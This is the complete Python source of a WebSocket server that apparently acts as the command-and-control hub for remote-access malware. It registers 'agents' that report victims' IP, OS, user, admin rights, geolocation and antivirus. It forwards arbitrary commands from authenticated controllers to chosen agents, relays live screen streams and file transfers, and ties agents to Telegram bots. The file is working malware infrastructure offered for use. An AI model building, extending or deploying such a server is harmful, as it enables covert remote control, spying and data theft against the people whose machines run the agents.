import asyncio
import json
import websockets
import sys
import io
import logging
import os
import secrets
import argparse
import pickle
import hmac
import hashlib
from encryption import BINARY_MAGIC, SecureSession, HAS_CRYPTOGRAPHY
from datetime import datetime, timedelta

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

parser = argparse.ArgumentParser(description="WebSocket Server")
parser.add_argument("--aes-key", type=str, help="AES key (enables secure mode with ECDH)")
parser.add_argument("--cert", type=str, help="SSL certificate file (PEM)")   
parser.add_argument("--key", type=str, help="SSL private key file (PEM)")    
args = parser.parse_args()

ssl_context = None
if args.cert and args.key:
    import ssl
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(args.cert, args.key)
    logging.info("[+] SSL enabled (wss://)")
else:
    logging.info("[+] No SSL certificate provided, using ws:// (insecure)")



CONFIG_FILE = "server_config.json"



def load_or_generate_token():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                token = config.get("auth_token")
                if token:
                    logging.info(f"[+] Token loaded from {CONFIG_FILE}")
                    return token
        except Exception as e:
            logging.warning(f"Could not read config: {e}")
    
    new_token = secrets.token_hex(16)
    config = {
        "auth_token": new_token,
        "created_at": datetime.now().isoformat(),
        "note": "Keep this token! Use it in controller."
    }
    
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
        logging.info(f"[+] New token generated and saved to {CONFIG_FILE}")
        logging.info(f"[+] TOKEN: {new_token}")
        print("\n" + "="*60)
        print(f"[+] YOUR AUTHENTICATION TOKEN:")
        print(f"   {new_token}")
        print("="*60 + "\n")
        print("[+] Save this token! You'll need it for controller.")
    except Exception as e:
        logging.error(f"Could not save token: {e}")
        new_token = "default_insecure_token_change_me"
    
    return new_token


USE_SECURE_MODE = False
AES_KEY = args.aes_key

if AES_KEY:
    USE_SECURE_MODE = True
    logging.info(f"[+] SECURE MODE ENABLED (ECDH + AES-GCM)")
    if HAS_CRYPTOGRAPHY:
        logging.info("[+] cryptography found, ECDH available")
    else:
        logging.warning("[!] cryptography not installed! Install with: pip install cryptography")
        logging.warning("[!] Secure mode will fall back to plain text!")
else:
    logging.info("[+] PLAIN MODE (no encryption, token only)")

AUTH_TOKEN = load_or_generate_token()

if sys.platform == 'win32':
    if hasattr(sys.stdout, "buffer"):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    if hasattr(sys.stderr, "buffer"):
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')


connected_agents = {}
connected_controllers = set()
connected_bots = {}


auth_sessions = {}  # websocket -> {'nonce': str, 'expires': datetime, 'authenticated': bool, 'username': str, 'secure_session': SecureSession}

def generate_nonce():
    return secrets.token_hex(32)

def verify_hmac(token, nonce, signature):
    expected = hmac.new(
        token.encode('utf-8'),
        nonce.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(expected, signature)


stream_sources = {}
stream_subscribers = {}
agent_streams = {}


pending_transfers = {}
transfer_lock = asyncio.Lock()

async def bridge_transfer(transfer_uuid):
    transfer = pending_transfers.get(transfer_uuid)
    if not transfer:
        return
    c_ws = transfer["controller_ws"]
    a_ws = transfer["agent_ws"]
    
    if not c_ws or not a_ws:
        logging.warning(f"[!] Transfer {transfer_uuid} missing one side")
        return
    
    async def forward(source, destination, name):
        try:
            async for message in source:
                try:
                    await destination.send(message)
                    await asyncio.sleep(0)
                except Exception as e:
                    logging.debug(f"[{name}] Forward error: {e}")
                    break
        except Exception as e:
            logging.debug(f"[{name}] Loop error: {e}")
        finally:
            try:
                await destination.close()
            except:
                pass

    await asyncio.gather(
        forward(c_ws, a_ws, "C→A"),
        forward(a_ws, c_ws, "A→C"),
        return_exceptions=True
    )
    
    if transfer_uuid in pending_transfers:
        del pending_transfers[transfer_uuid]
        logging.info(f"[*] Transfer tunnel {transfer_uuid} closed and cleaned up.")

BOTS_FILE = "telegram_bots.dat"
if os.path.exists(BOTS_FILE):
    try:
        with open(BOTS_FILE, "rb") as f:
            saved_bots = pickle.load(f)
            if isinstance(saved_bots, dict):
                connected_bots = saved_bots
                logging.info(f"[+] Loaded {len(connected_bots)} bots from {BOTS_FILE}")
    except Exception as e:
        logging.warning(f"Could not load bots from {BOTS_FILE}: {e}")


async def encrypt_message(data: dict, websocket=None):

    msg_str = json.dumps(data)
    

    if USE_SECURE_MODE and websocket and websocket in auth_sessions:
        session = auth_sessions[websocket]
        if 'secure_session' in session and session['secure_session'].cipher:
            return session['secure_session'].encrypt(msg_str)
    

    return msg_str

async def decrypt_message(encrypted_msg: str, websocket=None):

    if USE_SECURE_MODE and websocket and websocket in auth_sessions:
        session = auth_sessions[websocket]
        if 'secure_session' in session and session['secure_session'].cipher:
            try:
                decrypted = session['secure_session'].decrypt(encrypted_msg)
                return json.loads(decrypted)
            except Exception as e:
                logging.warning(f"Session decrypt failed: {e}")

    try:
        return json.loads(encrypted_msg)
    except:
        return None

async def broadcast_agents():
    if not connected_controllers:
        return

    agents_list_for_json = {
        aid: {k: v for k, v in info.items() if k != 'ws'}
        for aid, info in connected_agents.items()
    }
    
    disconnected_ctrls = set()
    for ws in list(connected_controllers):
        try:
            message = await encrypt_message({
                "type": "agents_list",
                "agents": agents_list_for_json
            }, ws)
            await ws.send(message)
        except Exception:
            disconnected_ctrls.add(ws)

    for ws in disconnected_ctrls:
        connected_controllers.discard(ws)
        logging.info("[-] Controller removed during broadcast.")

async def relay_to_controllers(message, agent_id):
    if not connected_controllers:
        return
    
    if isinstance(message, bytes):
        return
    
    try:
        data = json.loads(message)
        data['agent_id'] = agent_id
    except json.JSONDecodeError:
        logging.warning(f"Could not parse JSON from agent {agent_id}")
        return
    
    disconnected_ctrls = set()
    for ws in list(connected_controllers):
        try:

            msg_to_send = await encrypt_message(data, ws)
            await ws.send(msg_to_send)
        except Exception:
            disconnected_ctrls.add(ws)
    
    for ws in disconnected_ctrls:
        connected_controllers.discard(ws)

async def relay_binary_to_controllers(binary_data, agent_id):
    if not connected_controllers:
        return
    
    disconnected_ctrls = set()
    for ws in list(connected_controllers):
        try:
            await ws.send(binary_data)
        except Exception:
            disconnected_ctrls.add(ws)
    
    for ws in disconnected_ctrls:
        connected_controllers.discard(ws)

async def broadcast_bots_list():
    if not connected_controllers:
        return
    
    bots_list = []
    for token, bot_info in connected_bots.items():
        bots_list.append({
            'token': token,
            'name': bot_info.get('name'),
            'users': bot_info.get('users', []),
            'proxy': bot_info.get('proxy'),
            'agents': bot_info.get('agents', {})
        })
    
    disconnected_ctrls = set()
    for ws in list(connected_controllers):
        try:
            message = await encrypt_message({
                "type": "bots_list",
                "bots": bots_list
            }, ws)
            await ws.send(message)
        except Exception:
            disconnected_ctrls.add(ws)
    
    for ws in disconnected_ctrls:
        connected_controllers.discard(ws)
    
    try:
        with open(BOTS_FILE, "wb") as f:
            pickle.dump(connected_bots, f)
    except Exception as e:
        logging.error(f"Failed to save bots to disk: {e}")

async def send_agent_notification(agent_info):
    if not connected_controllers:
        logging.info("[!] No controllers connected, skipping notification")
        return
    
    logging.info(f"[*] Sending notification about new agent: {agent_info.get('name')} to {len(connected_controllers)} controller(s)")
    
    disconnected_ctrls = set()
    for ws in list(connected_controllers):
        try:
            notification = await encrypt_message({
                "type": "agent_connected_notification",
                "agent_id": agent_info.get("id"),
                "agent_name": agent_info.get("name"),
                "agent_ip": agent_info.get("ip"),
                "agent_os": agent_info.get("os"),
                "agent_user": agent_info.get("user"),
                "is_admin": agent_info.get("is_admin", False),
                "geo": agent_info.get("geo", {}),
                "timestamp": datetime.now().isoformat()
            }, ws)
            await ws.send(notification)
        except Exception:
            disconnected_ctrls.add(ws)
    
    for ws in disconnected_ctrls:
        connected_controllers.discard(ws)

async def handle_file_transfer(websocket, data):
    try:
        t_uuid = data.get("transfer_uuid")
        role = data.get("role")
        if not t_uuid:
            await websocket.close(1008, "Missing transfer_uuid")
            return
        if role not in ("controller", "agent"):
            await websocket.close(1008, "Invalid role")
            return

        async with transfer_lock:
            if t_uuid not in pending_transfers:
                pending_transfers[t_uuid] = {"controller_ws": None, "agent_ws": None}

            key = "controller_ws" if role == "controller" else "agent_ws"

            if pending_transfers[t_uuid][key] is not None:
                await websocket.close(1008, "Duplicate connection")
                return

            pending_transfers[t_uuid][key] = websocket

            if pending_transfers[t_uuid]["controller_ws"] and pending_transfers[t_uuid]["agent_ws"]:
                logging.info(f"[+] Both sides connected for {t_uuid}. Starting bridge...")
                asyncio.create_task(bridge_transfer(t_uuid))

        while t_uuid in pending_transfers:
            await asyncio.sleep(0.5)

    except Exception as e:
        logging.error(f"[!] File transfer error: {e}")
        try:
            await websocket.close(1011, f"Internal error: {e}")
        except:
            pass

async def handle_plain_connection(websocket, raw_init):

    client_type = None
    agent_id = None
    
    try:
        if isinstance(raw_init, bytes) and len(raw_init) >= 4 and raw_init[:4] == BINARY_MAGIC:
            if connected_controllers:
                await relay_binary_to_controllers(raw_init, "unknown")
            return
        
        if isinstance(raw_init, bytes):
            try:
                raw_init = raw_init.decode('utf-8')
            except:
                await websocket.close(1007, "Invalid message format")
                return
        
        try:
            data = json.loads(raw_init)
        except:
            await websocket.close(1007, "Invalid message format")
            return

        if data.get("type") == "stream_start":
            agent_id = data["agent_id"]
            monitor = data["monitor"]
            stream_id = f"{agent_id}_{monitor}"
            stream_sources[stream_id] = websocket
            agent_streams[agent_id] = stream_id
            logging.info(f"[+] Stream started for agent {agent_id}, monitor {monitor}")
            try:
                async for msg in websocket:
                    if isinstance(msg, bytes):
                        if stream_id in stream_subscribers:
                            disconnected_subs = set()
                            for sub_ws in stream_subscribers[stream_id]:
                                try:
                                    await sub_ws.send(msg)
                                except:
                                    disconnected_subs.add(sub_ws)
                            for sub_ws in disconnected_subs:
                                stream_subscribers[stream_id].discard(sub_ws)
            except websockets.ConnectionClosed:
                pass
            finally:
                stream_sources.pop(stream_id, None)
                agent_streams.pop(agent_id, None)
                if stream_id in stream_subscribers:
                    for sub_ws in stream_subscribers[stream_id]:
                        try:
                            await sub_ws.close()
                        except:
                            pass
                    del stream_subscribers[stream_id]
            return
        
        if data.get("type") == "stream_subscribe":
            agent_id = data["agent_id"]
            monitor = data.get("monitor", 1)
            stream_id = f"{agent_id}_{monitor}"
            if stream_id not in stream_subscribers:
                stream_subscribers[stream_id] = set()
            stream_subscribers[stream_id].add(websocket)
            logging.info(f"[+] Controller subscribed to stream {stream_id}")
            try:
                await websocket.wait_closed()
            finally:
                stream_subscribers[stream_id].discard(websocket)
                if not stream_subscribers[stream_id]:
                    del stream_subscribers[stream_id]
            return

        if data.get("type") == "data_channel":
            target_agent_id = data.get("id")
            logging.info(f"[→] Data Channel opened for agent: {target_agent_id}")
            async for bin_msg in websocket:
                disconnected_ctrls = set()
                for ws in list(connected_controllers):
                    try:
                        await ws.send(bin_msg)
                    except Exception:
                        disconnected_ctrls.add(ws)
                
                for ws in disconnected_ctrls:
                    connected_controllers.discard(ws)
                    
                if not connected_controllers:
                    break
            return

        if data.get("type") == "controller":
            client_type = "controller"

            token = data.get("token")
            if token != AUTH_TOKEN:
                logging.warning(f"[-] Invalid token from controller: {websocket.remote_address}")
                await websocket.close(1008, "Invalid token")
                return
            
            connected_controllers.add(websocket)
            logging.info(f"[+] Controller connected (plain mode): {websocket.remote_address}")
            await broadcast_agents()
            await broadcast_bots_list()
            
            async for msg_str in websocket:
                try:
                    cmd_data = json.loads(msg_str)
                    await process_controller_command(websocket, cmd_data)
                except Exception as e:
                    logging.warning(f"Error processing controller command: {e}")

        else:
            client_type = "agent"
            agent_id = data.get("id")
            if not agent_id:
                await websocket.close(1008, "No Agent ID")
                return

            token = data.get("token")
            if token != AUTH_TOKEN:
                logging.warning(f"[-] Invalid token from agent: {agent_id}")
                await websocket.close(1008, "Invalid token")
                return
            
            agent_info = {
                "ws": websocket,
                "name": data.get("name"), 
                "ip": data.get("ip"), 
                "os": data.get("os"),
                "user": data.get("user"), 
                "is_admin": data.get("is_admin"),
                "status": "online", 
                "geo": data.get("geo", {}),
                "disabled_modules": data.get("disabled_modules", []),
                "antivirus": data.get("antivirus", "Unknown")
            }
            
            is_new_agent = agent_id not in connected_agents
            
            connected_agents[agent_id] = agent_info
            logging.info(f"[+] Agent connected (plain mode): {data.get('name')}")
            
            if is_new_agent:
                await send_agent_notification({
                    "id": agent_id,
                    "name": data.get("name"),
                    "ip": data.get("ip"),
                    "os": data.get("os"),
                    "user": data.get("user"),
                    "is_admin": data.get("is_admin", False),
                    "geo": data.get("geo", {})
                })
            
            await broadcast_agents()

            while True:
                try:
                    msg = await websocket.recv()
                    if isinstance(msg, bytes):
                        if len(msg) >= 4 and msg[:4] == BINARY_MAGIC:
                            await relay_binary_to_controllers(msg, agent_id)
                        continue
                    
                    await relay_to_controllers(msg, agent_id)
                
                except websockets.ConnectionClosed:
                    logging.info(f"[-] Connection closed For Agent: {agent_id}")
                    break
                except Exception as e:
                    logging.error(f"[-] Error for {agent_id}: {e}")
                    break
    finally:
        if client_type == "controller":
            connected_controllers.discard(websocket)
            logging.info(f"[-] Controller disconnected: {websocket.remote_address}")
        elif client_type == "agent" and agent_id in connected_agents:
            if agent_id in agent_streams:
                stream_id = agent_streams.pop(agent_id)
                stream_sources.pop(stream_id, None)
                if stream_id in stream_subscribers:
                    for sub_ws in stream_subscribers[stream_id]:
                        try:
                            await sub_ws.close()
                        except:
                            pass
                    del stream_subscribers[stream_id]
            for token_bot, bot_info in connected_bots.items():
                if agent_id in bot_info.get('agents', {}):
                    del bot_info['agents'][agent_id]
                    logging.info(f"[*] Agent {agent_id} auto-unlinked from bot {bot_info.get('name')}")
            
            del connected_agents[agent_id]
            logging.info(f"[-] Agent disconnected: {agent_id}")

            disconnected_ctrls = set()
            for ws in list(connected_controllers):
                try:
                    msg = await encrypt_message({
                        "type": "agent_disconnected",
                        "agent_id": agent_id
                    }, ws)
                    await ws.send(msg)
                except Exception:
                    disconnected_ctrls.add(ws)
            
            for ws in disconnected_ctrls:
                connected_controllers.discard(ws)
            
            await broadcast_agents()
            await broadcast_bots_list()

async def process_controller_command(websocket, cmd_data):

    if cmd_data.get("type") == "bots_list_sync":
        bots_data = cmd_data.get("bots", [])
        for bot_data in bots_data:
            token_bot = bot_data.get('token')
            if token_bot not in connected_bots:
                connected_bots[token_bot] = {
                    'name': bot_data.get('name'),
                    'users': bot_data.get('users', []),
                    'proxy': bot_data.get('proxy'),
                    'agents': bot_data.get('agents', {})
                }
                logging.info(f"[+] New bot from sync: {bot_data.get('name')}")
            else:
                existing_agents = connected_bots[token_bot]['agents']
                new_agents = bot_data.get('agents', {})
                for agent_id_sync, agent_info in new_agents.items():
                    if agent_id_sync not in existing_agents:
                        existing_agents[agent_id_sync] = agent_info
                        logging.info(f"[+] Agent {agent_id_sync} linked to bot {token_bot}")
                connected_bots[token_bot]['name'] = bot_data.get('name')
                connected_bots[token_bot]['users'] = bot_data.get('users', [])
        await broadcast_bots_list()
        return
    
    bot_command = cmd_data.get("bot_command")
    
    if bot_command == "add_bot":
        token_bot = cmd_data.get("token")
        bot_name = cmd_data.get("bot_name")
        allowed_users = cmd_data.get("allowed_users", [])
        proxy_url = cmd_data.get("proxy_url")
        
        connected_bots[token_bot] = {
            'name': bot_name,
            'users': allowed_users,
            'proxy': proxy_url,
            'agents': {}
        }
        
        logging.info(f"[+] Bot {bot_name} added")
        await broadcast_bots_list()

        if USE_SECURE_MODE and websocket in auth_sessions:
            session = auth_sessions[websocket]
            if session.get('secure_session') and session['secure_session'].cipher:
                await websocket.send(session['secure_session'].encrypt(json.dumps({
                    "type": "bot_operation_result",
                    "success": True,
                    "msg": f"Bot {bot_name} added",
                    "operation": "add_bot",
                    "token": token_bot
                })))
                return
        
        await websocket.send(json.dumps({
            "type": "bot_operation_result",
            "success": True,
            "msg": f"Bot {bot_name} added",
            "operation": "add_bot",
            "token": token_bot
        }))
        
    elif bot_command == "remove_bot":
        token_bot = cmd_data.get("token")
        
        if token_bot in connected_bots:
            bot_name = connected_bots[token_bot].get('name', 'Unknown')
            del connected_bots[token_bot]
            logging.info(f"[+] Bot {bot_name} removed")
            await broadcast_bots_list()
            
            if USE_SECURE_MODE and websocket in auth_sessions:
                session = auth_sessions[websocket]
                if session.get('secure_session') and session['secure_session'].cipher:
                    await websocket.send(session['secure_session'].encrypt(json.dumps({
                        "type": "bot_operation_result",
                        "success": True,
                        "msg": f"Bot deleted successfully",
                        "operation": "delete_bot",
                        "token": token_bot
                    })))
                    return
            
            await websocket.send(json.dumps({
                "type": "bot_operation_result",
                "success": True,
                "msg": f"Bot deleted successfully",
                "operation": "delete_bot",
                "token": token_bot
            }))
    
    elif bot_command == "link_agent":
        token_bot = cmd_data.get("token")
        agent_id_link = cmd_data.get("agent_id")
        agent_info = cmd_data.get("agent_info", {})
        
        if token_bot in connected_bots:
            connected_bots[token_bot]['agents'][agent_id_link] = agent_info
            logging.info(f"[+] Agent {agent_id_link} linked to bot {token_bot}")
            await broadcast_bots_list()
            
            if USE_SECURE_MODE and websocket in auth_sessions:
                session = auth_sessions[websocket]
                if session.get('secure_session') and session['secure_session'].cipher:
                    await websocket.send(session['secure_session'].encrypt(json.dumps({
                        "type": "bot_operation_result",
                        "success": True,
                        "msg": f"Agent linked to bot",
                        "operation": "link_agent",
                        "token": token_bot,
                        "agent_id": agent_id_link
                    })))
                    return
            
            await websocket.send(json.dumps({
                "type": "bot_operation_result",
                "success": True,
                "msg": f"Agent linked to bot",
                "operation": "link_agent",
                "token": token_bot,
                "agent_id": agent_id_link
            }))
    
    elif bot_command == "unlink_agent":
        token_bot = cmd_data.get("token")
        agent_id_unlink = cmd_data.get("agent_id")
        
        if token_bot in connected_bots and agent_id_unlink in connected_bots[token_bot]['agents']:
            del connected_bots[token_bot]['agents'][agent_id_unlink]
            logging.info(f"[+] Agent {agent_id_unlink} unlinked from bot {token_bot}")
            await broadcast_bots_list()
            
            if USE_SECURE_MODE and websocket in auth_sessions:
                session = auth_sessions[websocket]
                if session.get('secure_session') and session['secure_session'].cipher:
                    await websocket.send(session['secure_session'].encrypt(json.dumps({
                        "type": "bot_operation_result",
                        "success": True,
                        "msg": f"Agent unlinked from bot",
                        "operation": "unlink_agent",
                        "token": token_bot,
                        "agent_id": agent_id_unlink
                    })))
                    return
            
            await websocket.send(json.dumps({
                "type": "bot_operation_result",
                "success": True,
                "msg": f"Agent unlinked from bot",
                "operation": "unlink_agent",
                "token": token_bot,
                "agent_id": agent_id_unlink
            }))

    else:

        target_id = cmd_data.get("target")
        if target_id and target_id in connected_agents:
            target_ws = connected_agents[target_id].get("ws")
            if target_ws:

                if USE_SECURE_MODE and target_ws in auth_sessions:
                    session = auth_sessions[target_ws]
                    if session.get('secure_session') and session['secure_session'].cipher:
                        await target_ws.send(session['secure_session'].encrypt(json.dumps(cmd_data)))
                        logging.debug(f"Command relayed to {target_id} (encrypted)")
                        return
                await target_ws.send(json.dumps(cmd_data))
                logging.debug(f"Command relayed to {target_id}")

async def handle_connection(websocket, path=None):

    client_type = None
    agent_id = None

    try:

        raw_init = await asyncio.wait_for(websocket.recv(), timeout=30)
        try:
            if isinstance(raw_init, bytes):
                init_str = raw_init.decode('utf-8')
            else:
                init_str = raw_init
            init_data = json.loads(init_str)
        except (json.JSONDecodeError, UnicodeDecodeError):

            await handle_plain_connection(websocket, raw_init)
            return

        if init_data.get("action") == "init_file_transfer":
            await handle_file_transfer(websocket, init_data)
            return

        if init_data.get("type") in ("stream_start", "stream_subscribe", "data_channel"):
            await handle_plain_connection(websocket, raw_init)
            return

        if USE_SECURE_MODE:

            if init_data.get("type") == "auth_request":
                if not HAS_CRYPTOGRAPHY:
                    await websocket.close(1008, "Secure mode requires cryptography")
                    return
                nonce = generate_nonce()
                auth_sessions[websocket] = {
                    'nonce': nonce,
                    'expires': datetime.now() + timedelta(seconds=30),
                    'authenticated': False,
                    'username': None,
                    'secure_session': None,
                    'client_type': None
                }
                await websocket.send(json.dumps({"type": "auth_challenge", "nonce": nonce}))

            else:

                await websocket.close(1008, "Expected auth_request")
                return

            while True:
                try:
                    msg = await websocket.recv()
                except websockets.ConnectionClosed:
                    break
                except Exception:
                    break

                try:
                    if isinstance(msg, bytes):
                        msg_str = msg.decode('utf-8')
                    else:
                        msg_str = msg

                    if websocket in auth_sessions and auth_sessions[websocket].get('authenticated'):
                        session = auth_sessions[websocket]
                        if session.get('secure_session') and session['secure_session'].cipher:
                            try:
                                decrypted = session['secure_session'].decrypt(msg_str)
                                data = json.loads(decrypted)
                            except:

                                data = json.loads(msg_str)
                        else:
                            data = json.loads(msg_str)
                    else:
                        data = json.loads(msg_str)
                except:

                    if isinstance(msg, bytes) and len(msg) >= 4 and msg[:4] == BINARY_MAGIC:

                        await relay_binary_to_controllers(msg, "unknown")
                    continue

                session = auth_sessions.get(websocket)

                if data.get("type") == "auth_response":
                    if not session or datetime.now() > session['expires']:
                        await websocket.close(1008, "Session expired or not found")
                        break
                    nonce = data.get("nonce")
                    signature = data.get("signature")
                    client_type = data.get("client_type", "unknown")
                    if nonce != session['nonce']:
                        await websocket.close(1008, "Invalid nonce")
                        break
                    if verify_hmac(AUTH_TOKEN, nonce, signature):
                        session['authenticated'] = True
                        session['username'] = data.get("username", "unknown")
                        session['client_type'] = client_type
                        await websocket.send(json.dumps({"type": "auth_success"}))
                        logging.info(f"[+] Client authenticated: {session['username']} ({client_type})")
                    else:
                        await websocket.close(1008, "Invalid signature")
                        break
                    continue

                if data.get("type") == "key_exchange":
                    if not session or not session.get('authenticated'):
                        await websocket.close(1008, "Not authenticated")
                        break
                    client_public = data.get("public_key")
                    if not client_public:
                        await websocket.close(1008, "Missing public key")
                        break
                    if session.get('secure_session') is None:
                        session['secure_session'] = SecureSession()
                    secure = session['secure_session']
                    if secure.set_peer_public_key(client_public):
                        await websocket.send(json.dumps({
                            "type": "key_exchange_response",
                            "public_key": secure.get_public_key_b64()
                        }))
                        logging.info(f"[+] ECDH key exchange completed for {session['username']}")
                    else:
                        await websocket.close(1008, "Key exchange failed")
                        break
                    continue

                if not session or not session.get('authenticated'):
                    await websocket.close(1008, "Not authenticated")
                    break
                if not session.get('secure_session') or not session['secure_session'].cipher:
                    await websocket.close(1008, "No encryption established")
                    break

                if data.get("type") == "controller":
                    client_type = "controller"
                    connected_controllers.add(websocket)
                    logging.info(f"[+] Controller connected (secure): {session.get('username')} ({websocket.remote_address})")
                    await broadcast_agents()
                    await broadcast_bots_list()

                    while True:
                        try:
                            msg = await websocket.recv()
                            if isinstance(msg, bytes):
                             
                                if len(msg) >= 4 and msg[:4] == BINARY_MAGIC:
                                    await relay_binary_to_controllers(msg, "unknown")
                                continue
                            
                            try:
                                decrypted = session['secure_session'].decrypt(msg)
                                cmd_data = json.loads(decrypted)
                            except:
                              
                                cmd_data = json.loads(msg)
                            
                            await process_controller_command(websocket, cmd_data)
                        except websockets.ConnectionClosed:
                            break
                        except Exception as e:
                            logging.warning(f"Controller command error: {e}")
                    break  

                elif data.get("type") == "agent":
                    client_type = "agent"
                    agent_id = data.get("id")
                    if not agent_id:
                        await websocket.close(1008, "No Agent ID")
                        break

                    username = session.get('username', agent_id)
                    agent_info = {
                        "ws": websocket,
                        "name": data.get("name", username),
                        "ip": data.get("ip"),
                        "os": data.get("os"),
                        "user": data.get("user"),
                        "is_admin": data.get("is_admin"),
                        "status": "online",
                        "geo": data.get("geo", {}),
                        "disabled_modules": data.get("disabled_modules", []),
                        "antivirus": data.get("antivirus", "Unknown")
                    }
                    is_new_agent = agent_id not in connected_agents
                    connected_agents[agent_id] = agent_info
                    logging.info(f"[+] Agent connected (secure): {agent_info.get('name')}")

                    if is_new_agent:
                        await send_agent_notification({
                            "id": agent_id,
                            "name": agent_info.get("name"),
                            "ip": agent_info.get("ip"),
                            "os": agent_info.get("os"),
                            "user": agent_info.get("user"),
                            "is_admin": agent_info.get("is_admin", False),
                            "geo": agent_info.get("geo", {})
                        })
                    await broadcast_agents()

                    while True:
                        try:
                            msg = await websocket.recv()
                            if isinstance(msg, bytes):
                                if len(msg) >= 4 and msg[:4] == BINARY_MAGIC:
                                    await relay_binary_to_controllers(msg, agent_id)
                                continue
      
                            try:
                                decrypted = session['secure_session'].decrypt(msg)
                                agent_msg = json.loads(decrypted)
                                await relay_to_controllers(json.dumps(agent_msg), agent_id)
                            except:
                                
                                await relay_to_controllers(msg, agent_id)
                        except websockets.ConnectionClosed:
                            break
                        except Exception as e:
                            logging.error(f"Agent error: {e}")
                    break  

                else:
                    logging.warning(f"Unexpected message type in secure mode: {data.get('type')}")
                    break

        else:
          
            await handle_plain_connection(websocket, raw_init)

    except asyncio.TimeoutError:
        logging.warning("[!] Connection timeout during initialization")
        try:
            await websocket.close(1008, "Initialization timeout")
        except:
            pass
    except websockets.ConnectionClosed:
        pass
    except Exception as e:
        logging.error(f"[!] Connection handler error: {e}")
        try:
            await websocket.close(1011, "Internal error")
        except:
            pass
    finally:
       
        if websocket in auth_sessions:
            del auth_sessions[websocket]
        
       
        if client_type == "agent" and agent_id and agent_id in connected_agents:
            if agent_id in agent_streams:
                stream_id = agent_streams.pop(agent_id)
                stream_sources.pop(stream_id, None)
                if stream_id in stream_subscribers:
                    for sub_ws in stream_subscribers[stream_id]:
                        try:
                            await sub_ws.close()
                        except:
                            pass
                    del stream_subscribers[stream_id]
            for token_bot, bot_info in connected_bots.items():
                if agent_id in bot_info.get('agents', {}):
                    del bot_info['agents'][agent_id]
                    logging.info(f"[*] Agent {agent_id} auto-unlinked from bot {bot_info.get('name')}")
            
            del connected_agents[agent_id]
            logging.info(f"[-] Agent disconnected: {agent_id}")


            disconnected_ctrls = set()
            for ws in list(connected_controllers):
                try:
                    msg = await encrypt_message({
                        "type": "agent_disconnected",
                        "agent_id": agent_id
                    }, ws)
                    await ws.send(msg)
                except Exception:
                    disconnected_ctrls.add(ws)
            
            for ws in disconnected_ctrls:
                connected_controllers.discard(ws)
            
            await broadcast_agents()
            await broadcast_bots_list()

async def main():
    PORT = 8081
    logging.info(f"WebSocket server starting on port {PORT}...")
    logging.info(f"[+] Authentication token: {AUTH_TOKEN}")
    
    if USE_SECURE_MODE:
        if HAS_CRYPTOGRAPHY:
            logging.info("[+] SECURE MODE: ECDH + AES-GCM")
        else:
            logging.warning("[!] SECURE MODE DISABLED: cryptography not installed")
            logging.warning("[!] Run: pip install cryptography")
            logging.warning("[!] Falling back to PLAIN MODE")
    else:
        logging.info("[+] PLAIN MODE (no encryption)")
    
    logging.info("Press Ctrl+C to stop")
    
    async with websockets.serve(
        handle_connection, 
        "0.0.0.0", 
        PORT,
        ssl=ssl_context,
        max_size=524288000, 
        ping_interval=60, 
        ping_timeout=90, 
        close_timeout=60
    ):
        await asyncio.Future()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("\nServer stopped")